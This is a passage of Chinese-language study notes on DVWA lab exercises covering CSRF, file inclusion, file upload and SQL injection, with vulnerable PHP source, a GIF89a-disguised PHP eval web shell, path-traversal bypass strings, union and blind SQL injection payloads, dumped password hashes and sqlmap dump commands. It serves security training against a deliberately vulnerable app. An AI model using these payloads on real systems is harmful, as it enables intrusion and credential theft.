        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

        // Feedback for the user
        echo "<pre>Password Changed.</pre>";
    }
    else {
        // Issue with passwords matching
        echo "<pre>Passwords did not match.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
- `checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );`中，`user_token`是浏览器请求中提交的随机字符串，`session_token`是服务器端存储的、之前生成的随机字符串，只有当两个值完全一致，服务器才会处理修改密码的请求。
- 困境1：`user_token`是随机生成的。
- 困境2：受害者访问的是恶意网站，受限于浏览器的同源策略(SOP)，javascript脚本无法跨域读取`dvwaip地址`页面里的HTML内容，拿不到隐藏的Token字段
### 侦测
使用Medium难度的方法，结果提示`CSRF token is incorrect`
修改密码后提示：http://192.168.242.18/vulnerabilities/csrf/index.php?password_new=111&password_conf=111&Change=Change&user_token=b4d124b786851d7fc9da1b2b45a12ba1#
### hack思路1：DVWA中储存型XSS漏洞获得网页token（待做）
### hack思路2：Burp Suite插件（CSRF Token Tracker）
CSRF Token Tracker用于自动化处理动态变化的Anti-CSRF Token，解决Token每请求一次就失效的问题
手动过程：访问页面 - 复制Token - 粘贴到请求里发送 - 再次访问页面获取新Token
插件使用：自动完成“提取并替换”的过程，直接在Repeater或Intruder中连续发送请求。
原理：告诉插件哪个URL会返回新的Token，定义如何从返回的HTML中找到这个Token，当通过Burp发送请求时，差劲啊会后台发一个请求去拿新Token，自动更新当前请求里的Token值，再发出去
选择CSRF Token Tracker菜单页，勾选规则同步，并填写host为dvwaip（这里为`192.168.242.18`），名称为user_token，在浏览器修改密码，将请求发送到**Repeater**，此时请求中包含一个旧的`user_token`，而到重放器后，修改密码参数并点击send，插件会在后台自动更新Token

## File inclusion(low)
### 源代码
```PHP
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
```
### 侦测
点击file1.php，URL变为`http://192.168.242.252/vulnerabilities/fi/?page=file1.php`
访问`http://192.168.242.252/vulnerabilities/fi/?page=file4.php`
远程文件包含：`http://192.168.242.252/vulnerabilities/fi/?page=http://www.baidu.com`（但没响应？）
本地文件包含：`http://192.168.242.252/vulnerabilities/fi/?page=../../phpinfo.php`

## File inclusion(Medium)
### 源代码
```PHP
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
```
- 第一行`str_replace();`防御远程文件包含（RFI）
- 第二行`str_replace();`防御本地文件包含（LFI）
- 绕过RFI：`http://192.168.242.252/vulnerabilities/fi/?page=hthttp://tp://www.baidu.com`
- 绕过LFI：`....//....//phpinfo.php`

## File inclusion(High)
### 源代码
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
```
- `if( !fnmatch( "file*", $file ) && $file != "include.php" )`，`fnmatch()`是php函数，检查字符串是否符合Shell通配符模式，如果`$file`变量的内容不是以`file`这四个字母开头，且文件不是include.php。
- 只有当文件名以`file`开头时，才允许包含该文件
- 漏洞是file://文件内部路径，但是这里用**lingjing不清楚内部文件排列**

## File upload(easy)
### 源代码
```PHP
<?php

if( isset( $_POST[ 'Upload' ] ) ) { // 检查表单是否提交了Upload按钮
    // Where are we going to be writing to?，定义目标上传路径
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";// 设置目标路径为一个固定目录
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );// 将上传文件的基础名称附加到目标路径

    // Can we move the file to the upload folder?，尝试将文件移动到上传文件夹
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';// 提示用户图像未上传
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";// 提示用户文件上传成功
    }
}

?>
```
### 侦测
上传`test.php`文件后提示：`../../hackable/uploads/test.php succesfully uploaded!`
## File upload(Medium)
### 源代码
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```
### 侦测
上传`test.php`文件后提示：`Your image was not uploaded. We can only accept JPEG or PNG images.`
修改文件名字`test.jpg`后提示：`../../hackable/uploads/test.jpg succesfully uploaded!`

## File upload(High)
### 源代码
```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    // Is it an image?
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        // Invalid file
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```
### 侦测
选择`test.jpg`后上传，提示`Your image was not uploaded. We can only accept JPEG or PNG images.`
high难度引入`getimagesize()`函数来检查文件内容，该函数会读取文件的头部字节，尝试计算图片的宽度和高度，如果上传的`test.jpg`中只写了PHP代码，而没用真正的图片数据，此函数无法获取到尺寸，会判断这不是一张有效的图片，从而报错。
### burp suite使用
截取信息，放入重放器，添加文件头`GIF89a`
```PHP
GIF89a
<?php @eval($_POST["a"]);?>
```
- `GIF89a`是GIF图片格式的魔术字节
- 第二行的一句话木马是核心恶意代码，`@`是错误抑制符，防止代码执行出错时在页面上显示报错信息，`eval()`将字符串作为PHP代码执行，`$_POST["a"]`接收攻击者通过POST请求发送的参数`a`中的内容

## SQL Injection(low)
### 源代码
```PHP
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```
### 侦测
1. 判断提交方式：当输入1，并提交后，URL变为`http://192.168.242.247/vulnerabilities/sqli/?id=1&Submit=Submit#`，提交方式为get
2. 判断服务器处理类型（数字型or字符型）：提交`1'`，报错：`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1`，确定为字符型输入。
3. 判断注入点：提交`1' or 1=1#`，返回全部内容，存在注入点
4. 判断列数：使用`order by`语句判断数据库表中的列数，当输入到`1' order by 3#`报错，列数为2
5. 提取库名：`1' union select 1,database()#`，得到库名dvwa
6. 提取表名：`1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#`。
    `1'`：闭合掉原本sql语句中的单引号
    `union select`：联合查询，让数据库在返回正常的数据同时，也把想要的数据查出来
    `1,table_name`：因为原查询返回两列数据（First name Surname），所以也必须要选择两列，这里用数字`1`填充第一列，用真正的`table_name`填充第二列。
    `from information_schema.tables`：是MySQL的百科全书，记录了所有数据库、表、列的名字
    `where table_schema='dvwa'`：精确查找，只看`dvwa`这个数据库下的表
    `#`：注释掉后面多余的符号，防止报错
7. 提取users的字段名：`1' union select 1,column_name from information_schema.columns where table_name='users'#`
    得到列名：`user`（登录用户名）、`password`（密码的MD5哈希值）、`user_id`（用户唯一标识符，主键）、`first_name`（用户的名）、`last_name`（用户的姓）、`avatar`（头像路径）、`last_login`（登录时间）、`failed_login`（登陆失败次数），
8. 执行数据脱裤(Data Dumping)，将所有用户名和密码哈希值显示出来：`1' union select user, password from users #`。
    admin:5f4dcc3b5aa765d61d8327deb882cf99
    gordonb:e99a18c428cb38d5f260853678922e03
    1337:8d3533d75ae2c3966d7e0d4fcc69216b
    pablo:0d107d09f5bbe40cade3de5c71e9e9b7
    smithy:5f4dcc3b5aa765d61d8327deb882cf99
9. MD5解码：使用kali linux的John the Ripper工具，在`DVWA`文件夹里创建一个`hash.txt`文件，里面采用用户名:密码对应的形式，再执行`john --format=Raw-MD5 ~/Desktop/DVWA/hash.txt`，查看破解的结果代码为`john --show --format=Raw-MD5 ~/Desktop/DVWA/hash.txt`，删除破解记录`rm ~/.john/john.pot`

## SQL Injection(Medium)
### 源代码
```PHP
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```
- ` $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);`该函数对单引号`'`号、双引号`"`、反斜杠`\ `等特殊字符进行转义
- `$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";`这里有漏洞，变量`$id`两边没用单引号包裹。
  - `$id`在SQL语句中是作为数字型参数传递的，攻击者在构造Payload时不需要用单引号，如果SQL语句是`... WHERE user_id = '$id'`（字符型），那么转义字符会把输入的`'`变成`\'`从而导致闭合失败，但现在语句会让输入的任何内容直接拼接在等号后面

### 侦测
提交页面后,URL不变,提交方式变为`POST`
参数类型为数字型(不用单引号)
### burp suite使用
截取信息如下
```http
POST /vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.242.247
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://192.168.242.247
Connection: keep-alive
Referer: http://192.168.242.247/vulnerabilities/sqli/
Cookie: PHPSESSID=7p4tc2r98mdsptmkd504vtjmf2; security=medium
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1&Submit=Submit
```
将`id=1`修改成payload
1. 确认列数:`id=4 order by 1#`（1、2、3），确认有2列
2. 库、表、字段、值：
`id=4 union select 1,database()#`//库名
First name：Pablo，Surname：Picasso；
First name：1，Surname：dvwa

`id=4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#`//表名，由于无法使用单引号，dvwa的十六进制是0x64767761，注意这里是英文的x，而不是叉号
First name：Pablo，Surname：Picasso；
First name：1，Surname：guestbook；
First name：1，Surname：users；

`id=4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#`//字段，users的十六进制是7573657273
First name：1
Surname：Picasso,user_id,first_name,last_name,user,password,avatar,last_login,failed_login

`id=4 union select user,password from users#`//值
得到账户明码

### SQLmap使用
```shell
sqlmap -r ~/Desktop/DVWA/sqlin/1.txt --cookie "PHPSESSID=7p4tc2r98mdsptmkd504vtjmf2; security=medium" --batch --dbs
```
获取两个可用数据库名称dvwa、information_schema
```shell
sqlmap -r ~/Desktop/DVWA/sqlin/1.txt  --cookie "PHPSESSID=7p4tc2r98mdsptmkd504vtjmf2; security=medium" --batch -D dvwa -T users -C user,password --dump
```
得到user、password数据的表格

## SQL Injection(High)
### 源代码
```PHP
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```
- Session传递：`$id = $_SESSION[ 'id' ];`点击查询时候，弹出新的小窗口输入ID，随后该值被存入服务器端的Session中，主页面刷新，从Session里读出这个ID进行查询。
- Repeater无效：而查询页面本身不接受`GET`或`POST`参数，如果直接在Repeater里重放主页面的请求，它只会一直查询你上一次存入Session的那个旧值，无法实时修改Payload。
- Medium难度是数字型注入，SQL语句是`WHERE user_id = ￥id`，不需要单引号比好，也因为有`mysqli_real_escape_string`过滤，不能用单引号
- High难度是字符型注入，SQL语句是`WHERE user_id = '$id'`，必须用单引号来闭合，虽然没有过滤函数，但通过切换页面和Session存储，试图增加自动扫描工具(SQLmap)的难度
- `LIMIT 1`的干扰，
### 侦测
输入1、2、3、4、5，URL不变
### payload注入/burp suite使用
1. 库名：`id=1' union select 1,database()#`
2. 表名：`id=1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#`
3. 提取users字段名：`id=1' union select 1,column_name from information_schema.columns where table_name='users'#`
4. 数据脱裤：`id=1' union select user, password from users#`
### SQLmap使用
提交数据与回显数据页面不同，这里添加第二个回显地址，将第一步抓到的数据存为`2.txt`
```shell
sqlmap -r ~/Desktop/DVWA/sqlin/2.txt --second-url "http://192.168.242.247/vulnerabilities/sqli/" --cookie "PHPSESSID=7p4tc2r98mdsptmkd504vtjmf2; security=high" --batch --dbs
```
获得dvwa和information_schema的数据库
```shell
sqlmap -r ~/Desktop/DVWA/sqlin/2.txt --second-url "http://192.168.242.247/vulnerabilities/sqli/" --cookie "PHPSESSID=7p4tc2r98mdsptmkd504vtjmf2; security=high" --batch -D dvwa -T users -C user,password --dump
```
得到用户名和密码

## SQL Injection(Blind)(easy)
### 源码
```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
- 其中`echo '<pre>User ID exists in the database.</pre>';`和`echo '<pre>User ID is MISSING from the database.</pre>';`说明，无论查什么，结果只有`ID exists`和`ID is MISSING`。
- 使用`@`符号和删除了`or die`逻辑，意味着即使SQL语句写错了，页面也不会弹出具体的数据库错误。

### 侦测（布尔盲注）
布尔盲注：通过构造SQL查询使结果影响网页响应，从而判断真假逐位推测数据库信息
1. 判断注入类型：
`1'`，显示`MISSING`
`1' #`，显示`exists`
为字符型盲注漏洞，为什么要有`＃`，因为在源代码中，注入后为`SELECT first_name, last_name FROM users WHERE user_id = '1'';`，会发现`'1''`多了一个单引号`'`，无法闭合，因此需要`#`将后面的单引号注释掉
2. 判断库名长度
`1' and length(database()) > 1 #`，接着`> 2、3、4`，到达`> 4`报错，说明长度就是4
3. 判断库名内容
`substr(string目标字符串, start, length)`
`1' and substr(database(),1,1)='d' #`，返回`exists`，数据库第一个字母是`d`
`1' and substr(database(),2,1)='v' #`，返回`exists`，数据库第二个字母是`v`

### 侦测（时间盲注）
时间盲注：利用数据库延时函数（`sleep`），根据响应时间长短推断SQL查询真伪，逐步获取数据库内容。
1. 判断注入类型
`1 and sleep(3) #`，反应很快，说明sleep()函数没有执行
`1' and sleep(3) #`，反应3s，说明sleep()函数执行，注入类型为字符型盲注
2. 判断库名长度
`1' and if(length(substr((database()), 1)) = 1, sleep(3), 1)#`，if(expr1,expr2,expr3)，如果expr1结果是True，则返回expr2，否则返回expr3。当`=4`的时候，有延迟，说明库名长度4位

### sqlmap使用
BURP SUITE先截取信息，准备好sqlmap代码
```SHELL
sqlmap -u "http://192.168.242.231/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=7vcr3t8d1ko9h1jgejo4cm4407; security=low" --batch --dbs
```
得到dvwa和information_schema两个可以获得的库，接着选择dvwa数据库，爆破dvwa数据库下的表名
```SHELL
sqlmap -u "http://192.168.242.231/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=7vcr3t8d1ko9h1jgejo4cm4407; security=low" --batch -D dvwa --tables
```
得到dvwa数据库下的表名有guestbook，users，诘责和选择users数据表，查看users数据表有哪些字段
```SHELL
sqlmap -u "http://192.168.242.231/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=7vcr3t8d1ko9h1jgejo4cm4407; security=low" --batch -D dvwa -T users --columns
```
得到user数据表中的column(列名)和Type，选择`user`、`password`进行破解
```SHELL
sqlmap -u "http://192.168.242.231/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie "PHPSESSID=7vcr3t8d1ko9h1jgejo4cm4407; security=low" --batch -D dvwa -T users -C user,password --dump
```
得到账户密码
## SQL Injection(Blind)(medium)
### 源代码
### 侦测（布尔盲注）
使用burp suite截取信息，并修改信息尝试注入
`id=1' and length(database()) > 1 #`，失败，不是字符型
`id=1 and length(database()) > 1 #`，成功，判断为数字型
`id=1 and substr(database(),1,1)='d' #`，失败，可能进行了过滤`'`，导致失败，接着尝试用ASCII码值来替代原来单引号括起来的内容
`id=1 and ascii(substr(database(), 1, 1)) = 100 #`，成功，数据库第一个字母为`d`
`id=1 and database() = 0x64767761 #`，使用十六进制，判断数据库名是否为dvwa，成功
### 侦测（时间盲注）
`1 and if(length(substr((database()), 1)) = 4, sleep(3), 1)#`，卡住3s，判断库名长度4位

## SQL Injection(Blind)(High)
### 侦测
burp suite抓包，将内容保存在`1.txt`文本文件里，注入payload后结果如下：
```SHELL
┌──(kali㉿kali)-[~]
└─$ sqlmap -r "~/Desktop/DVWA/sqlinblind/1.txt" --second-url "http://192.168.242.231/vulnerabilities/sqli_blind/" --batch
        ___
       __H__                                                                 
 ___ ___[,]_____ ___ ___  {1.9.11#stable}                                    
|_ -| . [,]     | .'| . |                                                    
|___|_  [)]_|_|_|__,|  _|                                                    
      |_|V...       |_|   https://sqlmap.org                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:09:28 /2026-01-15/

[02:09:28] [INFO] parsing HTTP request from '/home/kali/Desktop/DVWA/sqlinblind/1.txt'                                                                    
[02:09:28] [INFO] testing connection to the target URL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[02:09:28] [INFO] testing if the target URL content is stable
[02:09:29] [INFO] target URL content is stable
[02:09:29] [INFO] testing if POST parameter 'id' is dynamic
[02:09:29] [WARNING] POST parameter 'id' does not appear to be dynamic
[02:09:29] [WARNING] heuristic (basic) test shows that POST parameter 'id' might not be injectable
[02:09:29] [INFO] testing for SQL injection on POST parameter 'id'
[02:09:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:09:29] [INFO] POST parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)                       
[02:09:41] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[02:09:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                   
[02:09:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                        
[02:09:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                               
[02:09:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                    
[02:09:41] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                       
[02:09:43] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'                                                            
[02:09:47] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                       
[02:09:47] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                            
[02:09:47] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[02:09:47] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                              
[02:09:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                      
[02:09:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                       
[02:09:47] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                         
[02:09:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                          
[02:09:47] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                             
[02:09:47] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                  
[02:09:48] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[02:09:48] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                   
[02:09:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                
[02:09:48] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[02:09:48] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'                                                                    
[02:09:48] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                    
[02:09:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'                                                                          
[02:09:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                      
[02:09:48] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                   
[02:09:48] [INFO] testing 'Generic inline queries'
[02:09:48] [INFO] testing 'MySQL inline queries'
[02:09:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:09:48] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[02:09:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[02:09:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                       
[02:09:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[02:09:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'                                                                          
[02:09:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[02:09:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[02:09:56] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[02:10:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[02:10:06] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[02:10:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                        
[02:10:13] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'                                                                         
[02:10:53] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' injectable                                    
[02:10:53] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:10:53] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:10:53] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:10:58] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:10:58] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[02:11:15] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:11:15] [INFO] testing 'MySQL UNION query (26) - 1 to 20 columns'
[02:11:18] [INFO] testing 'MySQL UNION query (26) - 21 to 40 columns'
[02:11:26] [INFO] testing 'MySQL UNION query (26) - 41 to 60 columns'
[02:11:46] [INFO] testing 'MySQL UNION query (26) - 61 to 80 columns'
[02:11:53] [INFO] testing 'MySQL UNION query (26) - 81 to 100 columns'
[02:11:57] [INFO] checking if the injection point on POST parameter 'id' is a false positive
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 240 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 4501=4501 AND 'ESIG'='ESIG&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)
    Payload: id=1' OR SLEEP(5)#&Submit=Submit
---
[02:11:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[02:11:57] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 178 times
[02:11:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.242.231'                                         

[*] ending @ 02:11:57 /2026-01-15/
```
- `sqlmap`识别出：
  - `id`参数存在两种注入类型：布尔盲注和时间盲注
  - 环境信息：操作系统为Linux Debian 9(stretch)，数据库为MySQL >= 5.0.12(MariaDB)
